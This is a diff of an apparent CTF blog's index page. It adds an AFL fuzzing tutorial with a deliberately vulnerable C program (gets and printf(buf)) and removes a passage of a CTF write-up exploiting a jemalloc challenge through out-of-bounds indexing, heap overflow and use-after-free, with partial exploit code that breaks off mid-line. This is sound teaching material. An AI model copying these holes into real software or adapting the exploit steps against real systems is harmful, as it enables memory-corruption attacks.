@@ -156,6 +156,162 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/26/fuzz%E5%85%A5%E9%97%A8+AFL%E7%9A%84%E4%BD%BF%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/26/fuzz%E5%85%A5%E9%97%A8+AFL%E7%9A%84%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">fuzz入门+AFL的使用</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-07-26 11:05:59 / Modified: 11:08:52" itemprop="dateCreated datePublished" datetime="2022-07-26T11:05:59+08:00">2022-07-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>3.1k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>3 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>Fuzz 简述</strong></p>
+<p>模糊测试（Fuzzing）是一种基于黑盒的自动化软件模糊测试技术，简单的说一种懒惰且暴力的技术融合了常见的以及精心构建的数据文本进行网站、软件安全性测试</p>
+<p>好用的工具：AFL、LibFuzzer、honggfuzz</p>
+<p><strong>AFL 简述</strong></p>
+<p>AFL（American Fuzzy Lop）是由安全研究员 Michał Zalewski 开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具</p>
+<p>其工作流程大致如下： </p>
+<ul>
+<li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）</li>
+<li>选择一些输入文件，作为初始测试集加入输入队列（queue）</li>
+<li>将队列中的文件按一定的策略进行“突变”</li>
+<li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中</li>
+<li>上述过程会一直循环进行，期间触发了 crash 的文件会被记录下来</li>
+</ul>
+<p><img src="/2022/07/26/fuzz%E5%85%A5%E9%97%A8+AFL%E7%9A%84%E4%BD%BF%E7%94%A8/1658796625409.png" alt="1658796625409">  </p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/191536.html">AFL漏洞挖掘技术漫谈（一）</a> </p>
+<p><strong>AFL 安装</strong></p>
+<p>AFL 是一种面向安全的模糊器，它采用新型的编译时检测和遗传算法来自动发现有趣的测试用例，这些用例会触发目标二进制文件中的新内部状态</p>
+<p>安装 llvm 环境：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install clang llvm-dev llvm</span><br><span class="line">sudo apt-get install clang-3.4</span><br></pre></td></tr></table></figure>
+<p>使用如下命令下载 AFL 安装包：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</span><br></pre></td></tr></table></figure>
+<p>在解压后的文件中执行 <code>make</code> 进行编译，输入 <code>afl-fuzz</code> 以验证是否安装成功：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  afl-2.52b afl-fuzz</span><br><span class="line">afl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;</span><br></pre></td></tr></table></figure>
+<p>安装好的目录中应该有如下的文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  afl-2.52b ls</span><br><span class="line">afl-analyze    afl-fuzz      afl-showmap    debug.h        Makefile</span><br><span class="line">afl-analyze.c  afl-fuzz.c    afl-showmap.c  dictionaries   qemu_mode</span><br><span class="line">afl-as         afl-g++       afl-tmin       docs           QuickStartGuide.txt</span><br><span class="line">afl-as.c       afl-gcc       afl-tmin.c     experimental   README</span><br><span class="line">afl-as.h       afl-gcc.c     afl-whatsup    hash.h         testcases</span><br><span class="line">afl-clang      afl-gotcpu    alloc-inl.h    libdislocator  test-instr.c</span><br><span class="line">afl-clang++    afl-gotcpu.c  as             libtokencap    types.h</span><br><span class="line">afl-cmin       afl-plot      config.h       llvm_mode</span><br></pre></td></tr></table></figure>
+<ul>
+<li>afl-gcc 和 afl-g++ 分别对应的是 gcc 和 g++ 的封装</li>
+<li>afl-clang 和 afl-clang++ 分别对应 clang 的 c 和 c++ 编译器封装À</li>
+<li>afl-fuzz 是 AFL 的主体，用于对目标程序进行 fuzz</li>
+<li>afl-analyze 可以对用例进行分析，通过分析给定的用例，看能否发现用例中有意义的字段</li>
+<li>afl-qemu-trace 用于 qemu-mode，默认不安装，需要手工执行 qemu-mode 的编译脚本进行编译，后面会介绍</li>
+<li>afl-plot 生成测试任务的状态图</li>
+<li>afl-tmin 和 afl-cmin 对用例进行简化</li>
+<li>afl-whatsup 用于查看 fuzz 任务的状态</li>
+<li>afl-gotcpu 用于查看当前 CPU 状态</li>
+<li>afl-showmap 用于对单个用例进行执行路径跟踪</li>
+</ul>
+<p><strong>AFL 使用</strong></p>
+<p>AFL 需要一些初始输入数据（也叫种子文件）作为 Fuzzing 的起点，这些输入甚至可以是毫无意义的数据，AFL 可以通过启发式算法自动确定文件格式结构</p>
+<p>AFL 源码中自带了一个语料库：testcases</p>
+<p>测试代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用 afl-gcc 进行插桩编译：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  test afl-gcc test.c -o test_afl</span><br><span class="line">➜  test gcc test.c -o test_gcc</span><br></pre></td></tr></table></figure>
+<ul>
+<li>afl-gcc 插桩编译后，fuzz 的速度会快一些</li>
+</ul>
+<p>接下来就可以进行 fuzz 了：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  test afl-fuzz -i ./fuzz_in -o ./fuzz_out ./test_afl -f</span><br></pre></td></tr></table></figure>
+<ul>
+<li>fuzz_in 为语料库，我这里直接使用 AFL 自带的 testcases</li>
+<li>fuzz_out 就是输出的内容</li>
+</ul>
+<p>AFL 状态窗口如下：</p>
+<p><img src="/2022/07/26/fuzz%E5%85%A5%E9%97%A8+AFL%E7%9A%84%E4%BD%BF%E7%94%A8/1658801946787.png" alt="1658801946787"> </p>
+<p>详细介绍如下：</p>
+<p><img src="/2022/07/26/fuzz%E5%85%A5%E9%97%A8+AFL%E7%9A%84%E4%BD%BF%E7%94%A8/1658802035629.png" alt="1658802035629"> </p>
+<ul>
+<li>Process timing：Fuzzer 运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间</li>
+<li>Overall results：Fuzzer 当前状态的概述（尤其注意 uniq crashes）</li>
+<li>Cycle progress：我们输入队列的距离</li>
+<li>Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节</li>
+<li>Stage progress：Fuzzer 现在正在执行的文件变异策略、执行次数和执行速度</li>
+<li>Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息</li>
+<li>Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息</li>
+<li>Path geometry：有关 Fuzzer 找到的执行路径的信息</li>
+<li>CPU load：CPU利用率</li>
+</ul>
+<p><strong>Crashes 分析</strong></p>
+<p>在 <code>fuzz_out-&gt;crashes</code> 中有许多 crashes 信息，在 AFL 源码的 experimental/crash_triage 目录中有一个名为 triage_crashes.sh 的脚本，可以帮助我们触发收集到的 crashes </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  test ./triage_crashes.sh ./fuzz_out ./test_afl 2&gt;&amp;1 | grep SIGNAL</span><br><span class="line">+++ ID 000000, SIGNAL 11 +++</span><br><span class="line">+++ ID 000001, SIGNAL 06 +++</span><br><span class="line">+++ ID 000002, SIGNAL 06 +++</span><br><span class="line">+++ ID 000003, SIGNAL 06 +++</span><br><span class="line">+++ ID 000004, SIGNAL 06 +++</span><br><span class="line">+++ ID 000005, SIGNAL 11 +++</span><br></pre></td></tr></table></figure>
+<ul>
+<li>“11”代表了 SIGSEGV 信号，有可能是因为缓冲区溢出导致进程引用了无效的内存</li>
+<li>“6”代表了 SIGABRT 信号，通常由 libc 和其他库在出现严重错误时中止程序（也有可能是触发 canary 产生的错误）</li>
+</ul>
+<p><strong>AFL 练习</strong></p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/mykter/afl-training">Exercises to learn how to fuzz with American Fuzzy Lop</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/21/DSCTF2022/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2402,210 +2558,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/06/Jemalloc+UAF+%E5%A0%86%E6%BA%A2%E5%87%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/06/06/Jemalloc+UAF+%E5%A0%86%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">Jemalloc+UAF+堆溢出</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-06-06 22:11:18 / Modified: 22:15:56" itemprop="dateCreated datePublished" datetime="2022-06-06T22:11:18+08:00">2022-06-06</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>10k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>9 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>Ancienthouse 复现</strong></p>
-<p>这个程序有点特殊，它没有使用 ptmalloc，而是使用了 jemalloc：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn_Ancient_House ldd Ancienthouse</span><br><span class="line">	linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fffa5fcc000</span>)</span><br><span class="line">	./libjemalloc.so (<span class="number">0x00007faeaa826000</span>)</span><br><span class="line">	libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007faeaa61f000</span>)</span><br><span class="line">	libpthread.so<span class="number">.0</span> =&gt; /lib/x86_64-linux-gnu/libpthread.so<span class="number">.0</span> (<span class="number">0x00007faeaa5fc000</span>)</span><br><span class="line">	libdl.so<span class="number">.2</span> =&gt; /lib/x86_64-linux-gnu/libdl.so<span class="number">.2</span> (<span class="number">0x00007faeaa5f6000</span>)</span><br><span class="line">	/lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007faeaa85e000</span>)</span><br></pre></td></tr></table></figure>
-<p>其他信息：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn_Ancient_House file Ancienthouse</span><br><span class="line">Ancienthouse: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=c89baa4d5cf70d4da6d034cde16c86e4870f2e08, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">➜  pwn_Ancient_House checksec Ancienthouse              </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/pwn_Ancient_House/Ancienthouse&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-<p>64位，dynamically，全开</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn_Ancient_House ./Ancienthouse</span><br><span class="line">Who dares to enter these hallowed halls!! : <span class="number">0</span></span><br><span class="line">    _                  _               _     _   _                          </span><br><span class="line">   / \    _ __    ___ (_)  ___  _ __  | |_  | | | |  ___   _   _  ___   ___ </span><br><span class="line">  / _ \  | <span class="string">&#x27;_ \  / __|| | / _ \| &#x27;</span>_ \ | __| | |_| | / _ \ | | | |/ __| / _ \</span><br><span class="line"> / ___ \ | | | || (__ | ||  __/| | | || |_  |  _  || (_) || |_| |\__ \|  __/</span><br><span class="line">/_/   \_\|_| |_| \___||_| \___||_| |_| \__| |_| |_| \___/  \__,_||___/ \___|</span><br><span class="line">                                                                            </span><br><span class="line"></span><br><span class="line">============== MENU ==============</span><br><span class="line">| <span class="number">1.</span> Add Enemy                   |</span><br><span class="line">| <span class="number">2.</span> Battle                      |</span><br><span class="line">| <span class="number">3.</span> Merge                       |</span><br><span class="line">| <span class="number">4.</span> Enter <span class="built_in">any</span> other key to flee |</span><br><span class="line">==================================</span><br><span class="line">&gt;&gt; </span><br></pre></td></tr></table></figure>
-<p>大致说明一下程序的逻辑：</p>
-<ul>
-<li>有点类似于一种 “蚂蚁大战” 的游戏，程序中利用如下结构体来描述一个 “蚂蚁群落”：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Chunk struc ; (<span class="keyword">sizeof</span>=<span class="number">0x14</span>, mappedto_8) ; XREF: .bss:chunk_list/r</span><br><span class="line"><span class="number">00000000</span> name dq ?		<span class="comment">/* 指向一片装有name的heap空间 */</span></span><br><span class="line"><span class="number">00000008</span> num dd ?		<span class="comment">/* 表示群落中蚂蚁的数目 */</span></span><br><span class="line"><span class="number">0000000</span>C index dd ?		<span class="comment">/* 表示该Chunk在chunk_list中的索引 */</span></span><br><span class="line"><span class="number">00000010</span> size dd ?		<span class="comment">/* 表示name的长度 */</span></span><br><span class="line"><span class="number">00000014</span> Chunk ends</span><br></pre></td></tr></table></figure>
-<ul>
-<li>Add Enemy：添加一个新的 “蚂蚁群落”，默认 chunk-&gt;num 为 “0x64”</li>
-<li>Battle：使你的 “蚂蚁群落” 和目标 “蚂蚁群落” 打架，使目标 chunk-&gt;num 减少 “0xf”，如果 chunk-&gt;num 减少为 “0”，则可以选择 “杀死”（释放）它</li>
-<li>Merge：选择两个 “蚂蚁群落”，使其合并为一个</li>
-<li>Enter any other key to flee：执行一次函数指针，多半需要控制这里</li>
-</ul>
-<p><strong>漏洞分析</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">battle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> id; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Battle &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter enemy id : &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;id);</span><br><span class="line">  battle_s(id);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>在 battle 中输入的 id 没有进行检查，造成了数组越位</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !chunk_list[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There&#x27;s no one here to battle &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Starting battle with %s ....\n&quot;</span>, chunk_list[index]-&gt;name);</span><br><span class="line"><span class="keyword">if</span> ( chunk_list[index]-&gt;num &gt; <span class="number">0</span> )</span><br><span class="line">  chunk_list[index]-&gt;num -= chunk_head-&gt;num;  <span class="comment">// 0xF</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>只要 <code>chunk_list[index]</code> 不为空，就可用打印 <code>chunk_list[index]-&gt;name</code> 泄露数据</li>
-<li>此外，还可以利用 <code>chunk_list[index]-&gt;num -= chunk_head-&gt;num</code> 修改 index_max</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &lt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)index_max )</span><br></pre></td></tr></table></figure>
-<ul>
-<li>因为 index_max 是 unsigned int 类型，所以负数溢出后 index_max 会变得很大，突破了 add 的限制</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chunk = chunk_list[index1];</span><br><span class="line">chunk-&gt;name = (<span class="keyword">char</span> *)<span class="built_in">realloc</span>(chunk-&gt;name, size1 + size2);</span><br><span class="line">chunk_list[index1]-&gt;size = size1 + size2;</span><br><span class="line">chunk_list[index1]-&gt;num += chunk_list[index2]-&gt;num;</span><br><span class="line">merge_name(chunk_list[index1]-&gt;name, chunk_list[index2]-&gt;name, size1 + size2);</span><br></pre></td></tr></table></figure>
-<ul>
-<li>前面已经把 <code>chunk_list[index1]-&gt;size</code> 改为了 <code>size1 + size2</code> </li>
-<li>后面在执行 merge_name 时，依然使用 <code>size1 + size2</code></li>
-<li><code>size2</code> 被加了两遍，造成了堆溢出</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;killed&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">  <span class="built_in">free</span>(chunk_list[index]-&gt;name);</span><br><span class="line">  chunk_list[index] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>释放时，置空了 <code>chunk_list[index]</code>，但是没有置空 <code>chunk_list[index]-&gt;name</code></li>
-<li>可以利用堆风水来泄露 <code>chunk_list-&gt;name</code>（leak heap_addr）</li>
-</ul>
-<p><strong>泄露 pro_base 的思路</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x558ae15df000</span></span><br><span class="line"><span class="number">0x558ae15df000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000558ae15df008</span> <span class="comment">/* off_4008 */</span></span><br><span class="line"><span class="number">0x558ae15df010</span>:	<span class="number">0x00000000fffffff6</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558ae15df020</span> &lt;<span class="built_in">stdout</span>&gt;:	<span class="number">0x00007f3a7b9ad6a0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558ae15df030</span>:	<span class="number">0x00007f3a7a806040</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x558ae15df040</span>:	<span class="number">0x00007f3a7a80a040</span>	<span class="number">0x0000000000000000</span> <span class="comment">/* chunk_list */</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000004008</span> <span class="number">08</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_4008 dq offset off_4008             ; DATA XREF: sub_12A0+<span class="number">1B</span>↑r</span><br><span class="line">.data:<span class="number">0000000000004010</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                   index_max dd <span class="number">5</span>                          ; DATA XREF: add+<span class="number">24</span>↑r</span><br></pre></td></tr></table></figure>
-<ul>
-<li>off_4008 中装的是它自己，它后面“0x8”字节就是 index_max </li>
-<li>battle 可以减少 num，并且泄露 name，它们之间也相差“0x8”字节</li>
-<li>所以使 index_max 负数溢出的同时，可以泄露 off_4008，绕过 PIE</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">battle(-<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
-<p><strong>泄露 heap 的思路</strong></p>
-<ul>
-<li>在 add 中，程序会先 malloc(0x18) 申请一片空间给 “蚂蚁群落” 结构体 Chunk ，然后再申请 Chunk-&gt;name</li>
-<li>如果 Chunk-&gt;name 和 Chunk 属于同一个 run（size大小在同一范围），就会分配到一起</li>
-<li>利用堆风水，使 Chunk-&gt;name 分配到已经释放的 Chunk 上，由于释放的 Chunk 中 name 指针没有置空，所以新的 Chunk-&gt;name 可以泄露该指针</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x20</span>) </span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;2&#x27;</span> * <span class="number">0x20</span>) </span><br><span class="line"></span><br><span class="line">kill(<span class="number">0</span>) <span class="comment"># 需要释放两个Chunk,也就是4个region,两个0x60大小,两个0x20大小</span></span><br><span class="line">kill(<span class="number">1</span>) </span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># 需要占用两个0x20大小的region,第二个就会作为Chunk-&gt;name</span></span><br><span class="line">battle(<span 